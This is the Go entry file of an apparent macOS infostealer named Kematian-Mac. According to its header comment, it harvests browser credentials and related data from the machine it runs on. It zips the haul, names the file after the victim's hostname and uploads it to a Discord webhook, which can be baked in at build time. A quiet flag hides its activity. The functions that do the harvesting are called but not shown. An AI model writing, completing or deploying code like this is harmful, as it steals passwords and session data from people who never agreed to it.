// Kematian-Mac: standalone macOS harvest binary (from Kematian-main recovery engine).
// Collects browser credentials and related data, then uploads a zip to a Discord webhook.
package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
)

// Set at build time: -ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
var defaultWebhook string

func main() {
	webhookFlag := flag.String("webhook", "", "Discord webhook URL (or DISCORD_WEBHOOK_URL / KEMATIAN_WEBHOOK_URL)")
	quiet := flag.Bool("quiet", false, "minimal console output")
	flag.Parse()

	if runtime.GOOS != "darwin" {
		log.Fatalf("kematian is built for macOS only (GOOS=%s)", runtime.GOOS)
	}

	webhook := strings.TrimSpace(*webhookFlag)
	if webhook == "" {
		webhook = strings.TrimSpace(os.Getenv("DISCORD_WEBHOOK_URL"))
	}
	if webhook == "" {
		webhook = strings.TrimSpace(os.Getenv("KEMATIAN_WEBHOOK_URL"))
	}
	if webhook == "" {
		webhook = strings.TrimSpace(defaultWebhook)
	}
	if webhook == "" {
		log.Fatal("discord webhook required: -webhook, DISCORD_WEBHOOK_URL, KEMATIAN_WEBHOOK_URL, or build-time defaultWebhook")
	}

	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "mac"
	}

	if !*quiet {
		log.Printf("[kematian] starting harvest on %s (%s/%s)", hostname, runtime.GOOS, runtime.GOARCH)
	}

	payload, err := runHarvest(hostname)
	if err != nil {
		log.Fatalf("[kematian] harvest failed: %v", err)
	}

	zipData, err := buildHarvestZip(payload)
	if err != nil {
		log.Fatalf("[kematian] export failed: %v", err)
	}

	summary := harvestSummary(payload)
	filename := fmt.Sprintf("%s-kematian-%s.zip", sanitizeFilename(hostname), runtime.GOARCH)

	if !*quiet {
		log.Printf("[kematian] uploading %s (%d bytes) to Discord", filename, len(zipData))
	}

	if err := sendDiscordWebhook(webhook, summary, zipData, filename); err != nil {
		log.Fatalf("[kematian] discord upload failed: %v", err)
	}

	if !*quiet {
		log.Printf("[kematian] done")
	}
}

func sanitizeFilename(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteRune('_')
		}
	}
	out := b.String()
	if out == "" {
		return "mac"
	}
	return out
}